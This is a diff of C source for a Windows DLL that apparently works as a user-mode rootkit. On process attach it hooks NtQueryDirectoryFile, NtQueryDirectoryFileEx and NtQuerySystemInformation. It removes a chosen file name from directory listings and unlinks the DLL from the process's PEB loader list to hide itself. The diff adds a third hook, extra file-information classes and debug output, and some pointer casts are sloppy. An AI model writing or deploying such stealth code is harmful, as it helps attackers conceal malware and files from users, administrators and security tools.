@@ -126,15 +126,20 @@ NTSTATUS hookNtQDFE(
     fpNtQueryDirectoryFileEx QDFE;
     GVA(&QDFE);
     int res = QDFE(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
-    // printf("Hit the bloody function class %d\n", FileInformationClass);
     if (!NT_SUCCESS(res))
     {
         return res;
     }
+    printf("Hit NtQueryDirectoryFileEx with classid %d\n", FileInformationClass);
     switch (FileInformationClass)
     {
+    case FileDirectoryInformation:
+    case FileIdFullDirectoryInformation:
+    case FileIdBothDirectoryInformation:
+    case FileNamesInformation:
     case FileFullDirectoryInformation:
     case FileBothDirectoryInformation:
+
         PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
 
         ULONG next = 0;
@@ -142,9 +147,15 @@ NTSTATUS hookNtQDFE(
         while (1)
         {
             next = current->NextEntryOffset;
+            printf("[++] EX BOTH DIR INFO == 3\n");
+            printf("We encountered this file!\n");
+            wprintf(current->FileName);
+            printf("\n");
+            printf("Current address %p\n", current);
 
             if (custom_ucscmp(current->FileName, current->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
             {
+
                 // printf("[+] Found and patched the occurance\n");
                 if (current->NextEntryOffset)
                 {
@@ -161,7 +172,7 @@ NTSTATUS hookNtQDFE(
             }
             if (current->NextEntryOffset)
             {
-                current = (PFILE_BOTH_DIR_INFORMATION)((ULONG64)current + next);
+                current = (ULONG64)current + next;
             }
 
             else
@@ -170,6 +181,132 @@ NTSTATUS hookNtQDFE(
             }
         }
         break;
+    }
+    return res;
+}
+
+typedef NTSTATUS (*fpNtQueryDirectoryFile)(
+    HANDLE FileHandle,
+    HANDLE Event,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation,
+    ULONG Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN ReturnSingleEntry,
+    PUNICODE_STRING FileName,
+    BOOLEAN RestartScan);
+NTSTATUS hookNtQDF(
+    HANDLE FileHandle,
+    HANDLE Event,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation,
+    ULONG Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN ReturnSingleEntry,
+    PUNICODE_STRING FileName,
+    BOOLEAN RestartScan)
+{
+    fpNtQueryDirectoryFile QDF;
+    GVA(&QDF);
+    int res = QDF(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+    printf("Hit NtQueryDirectoryFile, RetSing %d, fileInfoClass %d\n", ReturnSingleEntry, FileInformationClass);
+    if (!NT_SUCCESS(res))
+    {
+        return res;
+    }
+    switch (FileInformationClass)
+    {
+    case FileDirectoryInformation:
+    case FileIdFullDirectoryInformation:
+    case FileNamesInformation:
+    case FileFullDirectoryInformation:
+    case FileBothDirectoryInformation:
+
+        PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+
+        ULONG next = 0;
+        PFILE_BOTH_DIR_INFORMATION prev = current;
+        while (1)
+        {
+            printf("[+] BOTH DIR INFO == 3\n");
+            printf("We encountered this file!\n");
+            wprintf(current->FileName);
+            printf("\n");
+            printf("Current address %p\n", current);
+            next = current->NextEntryOffset;
+
+            if (custom_ucscmp(current->FileName, current->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
+            {
+
+                // printf("[+] Found and patched the occurance\n");
+                if (current->NextEntryOffset)
+                {
+                    prev->NextEntryOffset += next;
+                }
+                else
+                {
+                    prev->NextEntryOffset = 0;
+                }
+            }
+            else
+            {
+                prev = current;
+            }
+            if (current->NextEntryOffset)
+            {
+                current = (ULONG64)current + next;
+            }
+
+            else
+            {
+                break;
+            }
+        }
+        break;
+    case FileIdBothDirectoryInformation:
+        PFILE_ID_BOTH_DIR_INFORMATION current1 = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
+        ULONG next1 = 0;
+        PFILE_ID_BOTH_DIR_INFORMATION prev1 = current1;
+        while (1)
+        {
+            printf("[+] ID BOTH INFO == 37\n");
+            printf("We encountered this file!\n");
+            wprintf(current1->FileName);
+            printf("\n");
+            printf("Current address %p\n", current1);
+            next1 = current1->NextEntryOffset;
+
+            if (custom_ucscmp(current1->FileName, current1->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
+            {
+
+                // printf("[+] Found and patched the occurance\n");
+                if (current1->NextEntryOffset)
+                {
+                    prev1->NextEntryOffset += next1;
+                }
+                else
+                {
+                    prev1->NextEntryOffset = 0;
+                }
+            }
+            else
+            {
+                prev1 = current1;
+            }
+            if (current1->NextEntryOffset)
+            {
+                current1 = (ULONG64)current1 + next1;
+            }
+
+            else
+            {
+                break;
+            }
+        }
     }
     return res;
 }
@@ -183,14 +320,17 @@ BOOL WINAPI DllMain(
     switch (fdwReason)
     {
     case DLL_PROCESS_ATTACH:
-        // GetModuleFileNameW(hinstDLL, spath_dll, sizeof(spath_dll));
-        // UnlinkPEBdll();
+        AllocConsole();
+        freopen("CONOUT$", "w", stdout);
         // Sleep(5000);
         HookInfo hNtQSI;
         HookInfo hNtQDFE;
+        HookInfo hNtQDF;
         InstallHook(_GetProcAddressNative("NtQuerySystemInformation"), hookNtQSI, &hNtQSI);
         InstallHook(_GetProcAddressNative("NtQueryDirectoryFileEx"), hookNtQDFE, &hNtQDFE);
-
+        InstallHook(_GetProcAddressNative("NtQueryDirectoryFile"), hookNtQDF, &hNtQDF);
+        GetModuleFileNameW(hinstDLL, spath_dll, sizeof(spath_dll));
+        UnlinkPEBdll();
         break;
 
     case DLL_THREAD_ATTACH:
